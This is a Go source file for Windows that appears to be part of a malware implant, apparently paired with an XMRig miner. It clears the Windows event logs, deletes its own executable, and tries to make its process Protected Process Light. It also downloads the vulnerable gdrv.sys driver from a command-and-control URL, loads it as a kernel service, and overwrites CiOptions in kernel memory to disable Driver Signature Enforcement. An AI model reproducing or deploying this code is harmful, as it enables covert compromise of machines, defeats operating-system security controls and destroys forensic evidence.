//go:build windows

package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// ── event log clearing ────────────────────────────────────────────────────────

func clearLogs() string {
	for _, log := range []string{"System", "Security", "Application"} {
		c := exec.Command("wevtutil.exe", "cl", log)
		hideWindow(c)
		c.Run()
	}
	return "event logs cleared: System, Security, Application"
}

// ── self-deletion (ping delay + del) ─────────────────────────────────────────

func selfDestruct() string {
	exe, err := os.Executable()
	if err != nil {
		return "self-destruct: could not get exe path"
	}
	cmd := fmt.Sprintf(`/c ping 127.0.0.1 -n 3 > nul & del /f "%s"`, exe)
	c := exec.Command("cmd", cmd)
	hideWindow(c)
	c.Start()
	return "self-destruct initiated"
}

// ── PPL protect ───────────────────────────────────────────────────────────────

var (
	ntdllaf                     = windows.NewLazySystemDLL("ntdll.dll")
	procNtSetInformationProcess = ntdllaf.NewProc("NtSetInformationProcess")
	procNtQuerySystemInfo       = ntdllaf.NewProc("NtQuerySystemInformation")
)

type psProtection struct{ Level uint8 }

func enablePPL() string {
	hToken, err := windows.OpenCurrentProcessToken()
	if err != nil {
		return fmt.Sprintf("PPL: OpenProcessToken failed: %v", err)
	}
	defer hToken.Close()

	var luid windows.LUID
	name, _ := windows.UTF16PtrFromString("SeTcbPrivilege")
	if err := windows.LookupPrivilegeValue(nil, name, &luid); err != nil {
		return fmt.Sprintf("PPL: LookupPrivilegeValue failed: %v", err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	windows.AdjustTokenPrivileges(hToken, false, &tp, 0, nil, nil)

	prot := psProtection{Level: 0x72}
	r, _, _ := procNtSetInformationProcess.Call(
		uintptr(windows.CurrentProcess()),
		0x3D,
		uintptr(unsafe.Pointer(&prot)),
		unsafe.Sizeof(prot),
	)
	if r != 0 {
		return fmt.Sprintf("PPL: NtSetInformationProcess failed: NTSTATUS 0x%X", r)
	}
	return "PPL: process marked as Protected Process Light (level 0x72)"
}

// ── BYOVD: gdrv.sys DSE disable ──────────────────────────────────────────────

const (
	// gdrv.sys (CVE-2018-19320) — GIGABYTE kernel driver, device type 0xC350.
	// All LOLDrivers samples (both 2bea1bca and 613b8509 entries) use this device type.
	// Device symlink: \DosDevices\GIO → \\.\GIO
	gdrvDevice   = `\\.\GIO`
	gdrvDropPath = `C:\Windows\Temp\gdrv.sys`

	// 0xC3502808: ring0 memcpy — copies [Count] bytes from SrcVA to DestVA.
	// Input: { DestVA uint64, SrcVA uint64, Count uint32 }
	// Both addresses must be kernel virtual addresses (no SMAP issue).
	gdrvIOCTLMemcpy = 0xC3502808

	// WinRing0x64.sys — OpenLibSys driver shipped by XMRig, zero file drop.
	winring0Device              = `\\.\WinRing0_1_2_0`
	winring0IOCTLReadPhysDword  = 0x9C402068
	winring0IOCTLWritePhysDword = 0x9C402070

	ciOptionsDisableDSE = byte(0x06)
)

// armBYOVD disables Driver Signature Enforcement by writing 0x06 to CiOptions
// in the running ntoskrnl. Tries WinRing0 first (if XMRig loaded it), then gdrv.
func armBYOVD() string {
	// Get ntoskrnl base from kernel module list
	ntosBase := getNtoskrnlBase()
	if ntosBase == 0 {
		return "BYOVD: NtQuerySystemInformation failed — needs admin"
	}

	// Find CiOptions RVA by scanning ntoskrnl.exe on disk
	ciRVA := findCiOptionsRVA()
	if ciRVA == 0 {
		return "BYOVD: CiOptions pattern not found in ntoskrnl.exe"
	}
	ciOptionsVA := ntosBase + uintptr(ciRVA)

	// Find a 0x06 byte in ntoskrnl .text to use as memcpy source (kernel VA, no SMAP)
	src06RVA := findByteRVA(0x06)
	if src06RVA == 0 {
		return "BYOVD: could not locate 0x06 byte in ntoskrnl .text"
	}
	src06VA := ntosBase + uintptr(src06RVA)

	// Try WinRing0 (no file drop — uses XMRig's already-loaded driver)
	if result := tryWinRing0DSE(ciOptionsVA); result != "" {
		return result
	}

	// Fall back to gdrv ring0 memcpy
	return tryGdrvMemcpy(ciOptionsVA, src06VA)
}

func tryGdrvMemcpy(ciOptionsVA, src06VA uintptr) string {
	if _, err := os.Stat(gdrvDropPath); os.IsNotExist(err) {
		resp, err := http.Get(C2URL + "/files/gdrv")
		if err != nil {
			return fmt.Sprintf("BYOVD(gdrv): download failed: %v", err)
		}
		defer resp.Body.Close()
		data, _ := io.ReadAll(resp.Body)
		if err := os.WriteFile(gdrvDropPath, data, 0644); err != nil {
			return fmt.Sprintf("BYOVD(gdrv): write driver failed: %v", err)
		}
	}

	if err := loadGdrv(); err != nil {
		return fmt.Sprintf("BYOVD(gdrv): load driver failed: %v", err)
	}
	time.Sleep(2 * time.Second)

	devPath, _ := windows.UTF16PtrFromString(gdrvDevice)
	hDev, err := windows.CreateFile(devPath,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0, nil, windows.OPEN_EXISTING, 0, 0)
	if err != nil {
		return fmt.Sprintf("BYOVD(gdrv): open \\.\\ GIO failed: %v", err)
	}
	defer windows.CloseHandle(hDev)

	// ring0 memcpy: copy 1 byte from src06VA (in ntoskrnl .text) to ciOptionsVA
	type memcpyReq struct {
		Dest  uint64
		Src   uint64
		Count uint32
		_     uint32
	}
	req := memcpyReq{
		Dest:  uint64(ciOptionsVA),
		Src:   uint64(src06VA),
		Count: 1,
	}
	var bytesRet uint32
	if err := windows.DeviceIoControl(hDev, gdrvIOCTLMemcpy,
		(*byte)(unsafe.Pointer(&req)), uint32(unsafe.Sizeof(req)),
		nil, 0, &bytesRet, nil); err != nil {
		return fmt.Sprintf("BYOVD(gdrv): memcpy IOCTL failed: %v", err)
	}
	return fmt.Sprintf("BYOVD: DSE disabled via gdrv ring0 memcpy (CiOptions=0x%X src=0x%X)", ciOptionsVA, src06VA)
}

// getNtoskrnlBase returns the runtime base address of ntoskrnl via
// NtQuerySystemInformation(SystemModuleInformation=11). The first module
// in the list is always ntoskrnl.exe.
func getNtoskrnlBase() uintptr {
	buf := make([]byte, 2*1024*1024)
	var retLen uint32
	r, _, _ := procNtQuerySystemInfo.Call(
		11, // SystemModuleInformation
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(len(buf)),
		uintptr(unsafe.Pointer(&retLen)),
	)
	if r != 0 || retLen < 32 {
		return 0
	}
	// RTL_PROCESS_MODULES layout (64-bit):
	//   [0] ULONG NumberOfModules  (4 bytes)
	//   [4] padding                (4 bytes)
	//   [8] RTL_PROCESS_MODULE_INFORMATION[0]:
	//       [0] Section  HANDLE   (8 bytes)
	//       [8] MappedBase PVOID  (8 bytes)
	//      [16] ImageBase PVOID   (8 bytes) ← runtime base
	return *(*uintptr)(unsafe.Pointer(&buf[24]))
}

// findCiOptionsRVA scans ntoskrnl.exe on disk for the pattern
// MOV AL,[RIP+rel32]; RET (8A 05 ?? ?? ?? ?? C3) which is a small getter
// function that returns the current CiOptions byte. Returns the RVA of
// the CiOptions variable itself.
func findCiOptionsRVA() uint32 {
	var img []byte
	for _, p := range []string{
		`C:\Windows\System32\ntoskrnl.exe`,
		`C:\Windows\System32\ntkrnlmp.exe`,
		`C:\Windows\System32\ntkrnlpa.exe`,
	} {
		if d, err := os.ReadFile(p); err == nil {
			img = d
			break
		}
	}
	if len(img) < 0x200 {
		return 0
	}

	peOff := binary.LittleEndian.Uint32(img[0x3C:])
	numSecs := binary.LittleEndian.Uint16(img[peOff+6:])
	optSz := binary.LittleEndian.Uint16(img[peOff+20:])
	secOff := peOff + 24 + uint32(optSz)

	for i := uint16(0); i < numSecs; i++ {
		s := secOff + uint32(i)*40
		if int(s)+40 > len(img) {
			break
		}
		secName := strings.TrimRight(string(img[s:s+8]), "\x00")
		if secName != ".text" {
			continue
		}
		secRVA := binary.LittleEndian.Uint32(img[s+12:])
		secRaw := binary.LittleEndian.Uint32(img[s+20:])
		secSz := binary.LittleEndian.Uint32(img[s+16:])

		for j := uint32(0); j+7 <= secSz; j++ {
			fo := secRaw + j
			if int(fo)+7 > len(img) {
				break
			}
			if img[fo] != 0x8A || img[fo+1] != 0x05 || img[fo+6] != 0xC3 {
				continue
			}
			rel := int32(binary.LittleEndian.Uint32(img[fo+2:]))
			ciRVA := int64(secRVA) + int64(j) + 6 + int64(rel)
			if ciRVA > 0 && ciRVA < 0x4000000 {
				return uint32(ciRVA)
			}
		}
	}
	return 0
}

// findByteRVA returns the RVA of the first occurrence of needle in ntoskrnl's
// .text section (skipping the first 0x1000 bytes to avoid jump tables).
// Used to get a stable kernel VA containing a known byte value for memcpy src.
func findByteRVA(needle byte) uint32 {
	var img []byte
	for _, p := range []string{
		`C:\Windows\System32\ntoskrnl.exe`,
		`C:\Windows\System32\ntkrnlmp.exe`,
	} {
		if d, err := os.ReadFile(p); err == nil {
			img = d
			break
		}
	}
	if len(img) < 0x200 {
		return 0
	}

	peOff := binary.LittleEndian.Uint32(img[0x3C:])
	numSecs := binary.LittleEndian.Uint16(img[peOff+6:])
	optSz := binary.LittleEndian.Uint16(img[peOff+20:])
	secOff := peOff + 24 + uint32(optSz)

	for i := uint16(0); i < numSecs; i++ {
		s := secOff + uint32(i)*40
		if int(s)+40 > len(img) {
			break
		}
		if strings.TrimRight(string(img[s:s+8]), "\x00") != ".text" {
			continue
		}
		secRVA := binary.LittleEndian.Uint32(img[s+12:])
		secRaw := binary.LittleEndian.Uint32(img[s+20:])
		secSz := binary.LittleEndian.Uint32(img[s+16:])

		for j := uint32(0x1000); j < secSz; j++ {
			if int(secRaw+j) >= len(img) {
				break
			}
			if img[secRaw+j] == needle {
				return secRVA + j
			}
		}
	}
	return 0
}

// ── WinRing0 DSE path ────────────────────────────────────────────────────────

func tryWinRing0DSE(ciOptionsVA uintptr) string {
	devPath, _ := windows.UTF16PtrFromString(winring0Device)
	hDev, err := windows.CreateFile(devPath,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		0, nil, windows.OPEN_EXISTING, 0, 0)
	if err != nil {
		return ""
	}
	defer windows.CloseHandle(hDev)

	physAddr := walkPageTableWR0(hDev, ciOptionsVA)
	if physAddr == 0 {
		return ""
	}

	var writeReq [12]byte
	*(*uint64)(unsafe.Pointer(&writeReq[0])) = physAddr
	*(*uint32)(unsafe.Pointer(&writeReq[8])) = uint32(ciOptionsDisableDSE)

	var bytesRet uint32
	if err := windows.DeviceIoControl(hDev, winring0IOCTLWritePhysDword,
		&writeReq[0], uint32(len(writeReq)),
		nil, 0, &bytesRet, nil); err != nil {
		return ""
	}
	return "BYOVD: DSE disabled via WinRing0 (XMRig driver, no file drop)"
}

func readPhysQwordWR0(hDev windows.Handle, physAddr uint64) uint64 {
	lo := readPhysDwordWR0(hDev, physAddr)
	hi := readPhysDwordWR0(hDev, physAddr+4)
	return uint64(lo) | (uint64(hi) << 32)
}

func readPhysDwordWR0(hDev windows.Handle, physAddr uint64) uint32 {
	var inBuf [8]byte
	var outBuf [4]byte
	*(*uint64)(unsafe.Pointer(&inBuf[0])) = physAddr
	var bytesRet uint32
	windows.DeviceIoControl(hDev, winring0IOCTLReadPhysDword,
		&inBuf[0], uint32(len(inBuf)),
		&outBuf[0], uint32(len(outBuf)),
		&bytesRet, nil)
	return *(*uint32)(unsafe.Pointer(&outBuf[0]))
}

func walkPageTableWR0(hDev windows.Handle, virtualAddr uintptr) uint64 {
	va := uint64(virtualAddr)
	pml4Idx := (va >> 39) & 0x1FF
	pdptIdx := (va >> 30) & 0x1FF
	pdIdx := (va >> 21) & 0x1FF
	ptIdx := (va >> 12) & 0x1FF
	offset := va & 0xFFF

	for cr3 := uint64(0x1000); cr3 < 0x200000; cr3 += 0x1000 {
		pml4e := readPhysQwordWR0(hDev, cr3+pml4Idx*8)
		if pml4e&1 == 0 {
			continue
		}
		if pml4e&0x80 != 0 {
			continue
		}
		pdptPA := pml4e & 0x0000FFFFFFFFF000
		pdpte := readPhysQwordWR0(hDev, pdptPA+pdptIdx*8)
		if pdpte&1 == 0 {
			continue
		}
		if pdpte&0x80 != 0 {
			return (pdpte & 0x0000FFFFC0000000) | (va & 0x3FFFFFFF)
		}
		pdPA := pdpte & 0x0000FFFFFFFFF000
		pde := readPhysQwordWR0(hDev, pdPA+pdIdx*8)
		if pde&1 == 0 {
			continue
		}
		if pde&0x80 != 0 {
			return (pde & 0x0000FFFFFFE00000) | (va & 0x1FFFFF)
		}
		ptPA := pde & 0x0000FFFFFFFFF000
		pte := readPhysQwordWR0(hDev, ptPA+ptIdx*8)
		if pte&1 == 0 {
			continue
		}
		return (pte & 0x7FFFFFFFFFFFF000) | offset
	}
	return 0
}

// ── service loader ────────────────────────────────────────────────────────────

func loadGdrv() error {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_ALL_ACCESS)
	if err != nil {
		return err
	}
	defer windows.CloseServiceHandle(scm)

	drvPath, _ := windows.UTF16PtrFromString(gdrvDropPath)
	svcName, _ := windows.UTF16PtrFromString("gdrv")
	displayName, _ := windows.UTF16PtrFromString("gdrv")

	svc, err := windows.CreateService(scm, svcName, displayName,
		windows.SERVICE_START|windows.SERVICE_STOP|windows.DELETE,
		windows.SERVICE_KERNEL_DRIVER,
		windows.SERVICE_DEMAND_START,
		windows.SERVICE_ERROR_IGNORE,
		drvPath, nil, nil, nil, nil, nil)
	if err != nil {
		if err == windows.ERROR_SERVICE_EXISTS {
			svc, err = windows.OpenService(scm, svcName,
				windows.SERVICE_START|windows.SERVICE_STOP|windows.DELETE)
			if err != nil {
				return err
			}
		} else {
			return err
		}
	}
	defer windows.CloseServiceHandle(svc)
	return windows.StartService(svc, 0, nil)
}
